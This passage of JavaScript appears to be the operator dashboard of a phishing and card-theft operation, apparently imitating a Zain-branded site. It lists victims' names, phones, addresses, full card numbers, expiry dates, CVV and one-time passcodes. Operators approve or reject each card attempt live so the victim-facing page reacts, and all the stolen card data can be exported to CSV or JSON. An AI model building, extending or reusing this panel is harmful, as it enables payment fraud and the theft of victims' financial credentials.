      await db.collection('customers').doc(sid).set({
        decision: decision,
        status: decision,
        decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
        lastSeen: Date.now(),
      }, { merge: true });
      toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
    } catch (err) {
      console.error('setDecision error:', err);
      toast('خطأ في إرسال القرار: ' + (err.message || ''), 'error');
    }
  }

  // موافقة/رفض لكل محاولة دفع (بطاقة) على حدة
  // يكتب القرار في وثيقة البطاقة cards/{cardId} (لإخفاء الأزرار وعرض الحالة)
  // ويكتبه أيضاً في customers/{sessionId} ليتفاعل موقع العميل
  async function setCardDecision(cardId, sessionId, decision, btnEl) {
    if (!cardId) { toast('تعذّر تحديد البطاقة', 'error'); return; }
    try {
      // تحديث فوري للواجهة (إخفاء الأزرار وعرض الحالة) قبل انتظار الشبكة
      if (btnEl) {
        const actionsBox = btnEl.closest('[data-card-actions]');
        if (actionsBox) {
          const isApproved = decision === 'approved';
          actionsBox.outerHTML = isApproved
            ? `<div class="mt-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-center"><span class="text-sm font-semibold text-emerald-400">✓ تمت الموافقة</span></div>`
            : `<div class="mt-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-center"><span class="text-sm font-semibold text-red-400">✕ تم الرفض</span></div>`;
        }
      }
      // كتابة القرار على وثيقة البطاقة (لكل محاولة على حدة)
      await db.collection('cards').doc(cardId).set({
        decision: decision,
        decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
      }, { merge: true });
      // كتابة القرار على وثيقة العميل ليتفاعل موقع العميل
      if (sessionId) {
        await db.collection('customers').doc(sessionId).set({
          decision: decision,
          status: decision,
          decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
          lastSeen: Date.now(),
        }, { merge: true });
      }
      toast(decision === 'approved' ? 'تمت الموافقة بنجاح' : 'تم الرفض', decision === 'approved' ? 'success' : 'error');
    } catch (err) {
      console.error('setCardDecision error:', err);
      toast('خطأ في إرسال القرار: ' + (err.message || ''), 'error');
    }
  }

  // ── تصدير البيانات ──────────────────────────────────────────
  function exportData(format) {
    const data = filteredNotifications.map(n => {
      const d = n.lastSeen ? new Date(n.lastSeen) : null;
      const itemsText = (n.items && n.items.length)
        ? n.items.map(it => `${it.name || 'منتج'} × ${it.qty || 1}`).join('، ')
        : '';
      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
      return {
        sessionId: n.sessionId || '', name: n.name || '', phone: n.phone || '', address: n.address || '',
        apartment: n.apartment || '', deliveryNotes: n.deliveryNotes || '', items: itemsText,
        paymentType: paymentLabel, amount: n.amount || '',
        bank: n.bank || '', cardNumber: n.cardNumber || '', expiry: n.expiryDate || '', cvv: n.cvv || '',
        otp: n.otp || '', status: n.decision || n.status || '', country: n.country || '',
        currentPage: n.currentPage || '', lastSeen: d ? d.toISOString() : '',
      };
    });
    const headers = ['sessionId', 'name', 'phone', 'address', 'apartment', 'deliveryNotes', 'items', 'paymentType', 'amount', 'bank', 'cardNumber', 'expiry', 'cvv', 'otp', 'status', 'country', 'currentPage', 'lastSeen'];
    if (format === 'json') {
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
      downloadBlob(blob, `notifications-${Date.now()}.json`);
    } else {
      const rows = [headers.join(',')].concat(data.map(r => headers.map(h => `"${String(r[h] || '').replace(/"/g, '""')}"`).join(',')));
      downloadBlob(new Blob(['\ufeff' + rows.join('\n')], { type: 'text/csv;charset=utf-8' }), `notifications-${Date.now()}.csv`);
    }
    els.exportMsg.textContent = 'تم التصدير بنجاح';
    els.exportMsg.classList.remove('hidden');
    setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
  }
  function downloadBlob(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = filename; a.click();
    URL.revokeObjectURL(url);
  }

  // ── الإعدادات ───────────────────────────────────────────────
  function applyShowStats() {
    if (showStats) els.statsSection.classList.remove('hidden');
    else els.statsSection.classList.add('hidden');
  }
  function saveSettings() {
    pageSize = parseInt(els.settingPageSize.value) || 10;
    showStats = els.settingShowStats.checked;
    autoRefresh = els.settingAutoRefresh.checked;
    localStorage.setItem('zain_panel_settings', JSON.stringify({ pageSize, showStats, autoRefresh }));
    applyShowStats();
    renderTable();
  }

  // ── ربط الأحداث (Event Listeners) ───────────────────────────
  // تسجيل الدخول
  els.loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    els.loginError.classList.add('hidden');
    try {
      await login(els.loginEmail.value.trim(), els.loginPassword.value);
      localStorage.setItem('zain_panel_auth', '1');
      showApp();
    } catch (err) {
      els.loginError.textContent = 'فشل تسجيل الدخول: ' + (err.message || err.code || 'تحقق من البيانات');
      els.loginError.classList.remove('hidden');
    }
  });

  // التحقق التلقائي من الجلسة
  firebase.auth().onAuthStateChanged((user) => {
    if (user && localStorage.getItem('zain_panel_auth') === '1') {
      showApp();
    }
  });

  // تسجيل الخروج
  els.menuLogout.addEventListener('click', logout);

  // القائمة المنسدلة
  els.btnMenu.addEventListener('click', (e) => {
    e.stopPropagation();
    els.menuDropdown.classList.toggle('hidden');
  });
  document.addEventListener('click', (e) => {
    if (!els.menuDropdown.contains(e.target) && e.target !== els.btnMenu) {
      els.menuDropdown.classList.add('hidden');
    }
  });

  // تحديث
  els.btnRefresh.addEventListener('click', () => {
    els.refreshIcon.classList.add('animate-spin');
    applyFilters();
    els.lastUpdate.textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
    setTimeout(() => els.refreshIcon.classList.remove('animate-spin'), 500);
  });

  // إظهار/إخفاء الإحصائيات
  els.btnToggleStats.addEventListener('click', () => {
    showStats = !showStats;
    els.settingShowStats.checked = showStats;
    localStorage.setItem('zain_panel_settings', JSON.stringify({ pageSize, showStats, autoRefresh }));
    applyShowStats();
  });

  // تبويبات الفلترة
  els.filterTabs.addEventListener('click', (e) => {
    const btn = e.target.closest('.filter-btn');
    if (!btn) return;
    currentFilter = btn.dataset.filter;
    currentPage = 1;
    document.querySelectorAll('.filter-btn').forEach(b => {
      b.removeAttribute('data-active');
      b.classList.remove('bg-emerald-600', 'text-white', 'bg-amber-600', 'bg-violet-600', 'bg-cyan-600');
    });
    const colorMap = { all: 'bg-emerald-600', pending: 'bg-amber-600', card: 'bg-violet-600', online: 'bg-cyan-600' };
    btn.setAttribute('data-active', 'true');
    btn.classList.add(colorMap[currentFilter], 'text-white');
    applyFilters();
  });

  // الترتيب
  els.sortSelect.addEventListener('change', (e) => {
    currentSort = e.target.value;
    applyFilters();
  });

  // الترتيب بالنقر على عناوين الأعمدة
  document.querySelectorAll('th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      currentSort = th.dataset.sort;
      els.sortSelect.value = currentSort;
      applyFilters();
    });
  });

  // البحث
  let searchTimer;
  els.searchInput.addEventListener('input', (e) => {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(() => {
      searchQuery = e.target.value.trim();
      currentPage = 1;
      applyFilters();
    }, 250);
  });

  // النقر على الجدول (تفويض الأحداث)
  els.tbody.addEventListener('click', (e) => {
    const infoBtn = e.target.closest('.info-btn');
    const approveBtn = e.target.closest('.action-approve');
    const rejectBtn = e.target.closest('.action-reject');
    if (infoBtn) { openDetail(infoBtn.dataset.id, infoBtn.dataset.info); }
    else if (approveBtn) { setDecision(approveBtn.dataset.id, 'approved'); }
    else if (rejectBtn) { setDecision(rejectBtn.dataset.id, 'rejected'); }
  });

  // الترقيم
  els.paginationButtons.addEventListener('click', (e) => {
    const btn = e.target.closest('.page-btn');
    if (!btn || btn.disabled) return;
    currentPage = parseInt(btn.dataset.page);
    renderTable();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });

  // نافذة التفاصيل
  els.detailClose.addEventListener('click', () => els.detailModal.classList.add('hidden'));
  els.detailCancel.addEventListener('click', () => els.detailModal.classList.add('hidden'));
  els.detailModal.addEventListener('click', (e) => {
    if (e.target === els.detailModal) els.detailModal.classList.add('hidden');
  });

  // نوافذ الإعدادات والتصدير
  els.menuSettings.addEventListener('click', () => { els.menuDropdown.classList.add('hidden'); els.settingsModal.classList.remove('hidden'); });
  els.settingsClose.addEventListener('click', () => els.settingsModal.classList.add('hidden'));
  els.settingPageSize.addEventListener('change', saveSettings);
  els.settingShowStats.addEventListener('change', saveSettings);
  els.settingAutoRefresh.addEventListener('change', saveSettings);

  els.menuExport.addEventListener('click', () => { els.menuDropdown.classList.add('hidden'); els.exportModal.classList.remove('hidden'); });
  els.exportClose.addEventListener('click', () => els.exportModal.classList.add('hidden'));
  els.exportJson.addEventListener('click', () => exportData('json'));
  els.exportCsv.addEventListener('click', () => exportData('csv'));

  // اختصارات لوحة المفاتيح
  document.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'r' && !els.app.classList.contains('hidden')) {
      e.preventDefault();
      els.btnRefresh.click();
    }
    if (e.key === 'Escape') {
      els.detailModal.classList.add('hidden');
      els.settingsModal.classList.add('hidden');
      els.exportModal.classList.add('hidden');
    }
  });

  // التحقق من جلسة محفوظة عند التحميل
  if (localStorage.getItem('zain_panel_auth') === '1') {
    firebase.auth().signInWithEmailAndPassword(PANEL_EMAIL, PANEL_PASSWORD)
      .then(() => showApp())
      .catch(() => { localStorage.removeItem('zain_panel_auth'); });
  }

  console.log('%cلوحة الإشعارات المتقدمة — جاهزة', 'color:#10b981;font-weight:bold');
})();
